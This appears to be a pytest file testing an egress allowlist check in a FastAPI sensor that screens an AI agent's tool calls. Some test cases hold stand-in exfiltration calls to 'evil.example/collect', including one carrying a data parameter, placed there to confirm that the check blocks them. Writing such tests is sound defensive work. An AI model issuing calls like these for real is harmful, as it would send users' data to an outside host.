"""
test_egress.py — Tests for check_egress (Policy check 1: destination allowlist)

Run against sensor.py via FastAPI TestClient. No Ollama required.
"""

import pytest
from fastapi.testclient import TestClient

import sys
sys.path.insert(0, str(__file__.replace("/tests/test_egress.py", "")))

from sensor import app, _decision_log, _active_canaries

client = TestClient(app)


def _make_request(tool: str, params: dict, output=None) -> dict:
    payload = {"call_id": "test-egress-001", "tool": tool, "params": params, "output": output}
    resp = client.post("/check", json=payload)
    assert resp.status_code == 200
    return resp.json()


def setup_function():
    """Ensure active mode for enforcement tests."""
    client.post("/mode", json={"mode": "active"})


# --- Block cases ---

def test_http_get_to_undeclared_destination_is_blocked():
    """http_get to evil.example is not in the allowlist → must be blocked."""
    result = _make_request("http_get", {"url": "http://evil.example/collect"})
    assert result["verdict"] == "block"
    assert "check_egress" in (result.get("check_fired") or "")


def test_http_get_to_attacker_bare_host_is_blocked():
    """Bare host without scheme is also blocked."""
    result = _make_request("http_get", {"url": "evil.example/collect?data=abc"})
    assert result["verdict"] == "block"


def test_tool_with_no_declared_destinations_is_blocked():
    """A tool not in policy.yaml has no allowlist → block."""
    result = _make_request("unknown_tool", {"url": "mail.internal"})
    assert result["verdict"] == "block"


# --- Allow cases ---

def test_http_get_to_declared_destination_is_allowed():
    """http_get to mail.internal is declared → allow."""
    result = _make_request("http_get", {"url": "http://mail.internal/api"})
    assert result["verdict"] == "allow"


def test_http_get_to_docs_internal_is_allowed():
    """http_get to docs.internal is in allowlist → allow."""
    result = _make_request("http_get", {"url": "docs.internal/readme"})
    assert result["verdict"] == "allow"


def test_read_email_without_destination_param_is_allowed():
    """read_email with only email_id param has no destination field → check passes vacuously."""
    result = _make_request("read_email", {"email_id": 1})
    assert result["verdict"] in ("allow", "flag")  # may flag if output present, but not block on egress


# --- Monitor mode: block verdict is logged but not enforced ---

def test_monitor_mode_logs_but_does_not_block():
    client.post("/mode", json={"mode": "monitor"})
    result = _make_request("http_get", {"url": "evil.example/collect"})
    # In monitor mode, enforced verdict is always allow
    assert result["verdict"] == "allow"
    assert "monitor" in result["reason"]
    # Restore
    client.post("/mode", json={"mode": "active"})
